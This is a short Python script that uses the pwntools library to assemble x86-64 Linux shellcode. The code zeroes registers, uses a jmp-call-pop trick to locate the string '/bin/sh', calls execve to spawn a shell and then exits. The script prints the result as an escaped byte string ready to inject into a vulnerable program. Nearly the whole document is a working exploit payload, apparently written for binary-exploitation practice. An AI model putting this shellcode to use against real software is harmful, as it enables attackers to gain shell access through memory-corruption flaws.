#!/usr/bin/env python
# -*- coding=utf-8 -*-

from pwn import *

context.arch = 'amd64'

buff = asm('''
        xor rax,rax
        xor rdi,rdi
        xor rsi,rsi
        xor rdx,rdx
        jmp get_str

main:
        pop rdi
        mov rax,59
        syscall
        mov rax,60
        syscall

get_str:
        call main
        .ascii "/bin/sh"
        .byte 0
''')

hexs = buff.encode('hex')
out = '"'
for i in xrange(len(hexs)/2):
    out += "\\x" + hexs[i*2:(i+1)*2]
out += '"'

#print buff
print out
